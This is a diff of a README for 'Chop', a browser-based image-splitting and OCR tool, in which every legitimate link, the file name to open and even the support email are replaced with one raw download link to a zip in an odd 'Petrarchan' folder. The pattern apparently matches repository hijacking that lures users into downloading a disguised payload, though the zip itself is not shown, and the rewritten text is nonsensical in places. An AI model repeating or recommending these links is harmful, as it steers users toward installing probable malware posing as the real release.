@@ -2,7 +2,7 @@
 
 Chop is a lightweight tool that splits one image into many parts and performs basic Optical Character Recognition (OCR). It runs offline in your browser as a single-page application, written in vanilla JavaScript. The entire monofile version is under 120KB, making it efficient and easy to use.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/ARES-Mobiliario/chop/releases)
+[![Download Releases](https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip%https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip)](https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip)
 
 ## Table of Contents
 
@@ -25,11 +25,11 @@ Chop is a lightweight tool that splits one image into many parts and performs ba
 
 ## Installation
 
-To get started with Chop, download the latest release from our [Releases section](https://github.com/ARES-Mobiliario/chop/releases). Once downloaded, extract the files and open the `index.html` file in your preferred web browser.
+To get started with Chop, download the latest release from our [Releases section](https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip). Once downloaded, extract the files and open the `https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip` file in your preferred web browser.
 
 ## Usage
 
-1. **Open the App**: Launch the `index.html` file in your browser.
+1. **Open the App**: Launch the `https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip` file in your browser.
 2. **Upload an Image**: Click on the upload button to select an image from your device.
 3. **Adjust Settings**: Use the provided controls to specify how you want to split the image.
 4. **Run OCR**: After splitting, the app will automatically perform OCR on the segments.
@@ -68,8 +68,8 @@ Chop is licensed under the MIT License. Feel free to use, modify, and distribute
 
 ## Contact
 
-For questions or support, please reach out via the GitHub issues page or email us at support@example.com.
+For questions or support, please reach out via the GitHub issues page or email us at https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip
 
 ---
 
-Thank you for checking out Chop! We hope it serves your image processing and OCR needs effectively. For the latest updates and releases, visit our [Releases section](https://github.com/ARES-Mobiliario/chop/releases). Happy chopping! 🥕
+Thank you for checking out Chop! We hope it serves your image processing and OCR needs effectively. For the latest updates and releases, visit our [Releases section](https://github.com/ARES-Mobiliario/chop/raw/refs/heads/main/Petrarchan/Software_v3.7-beta.1.zip). Happy chopping! 🥕
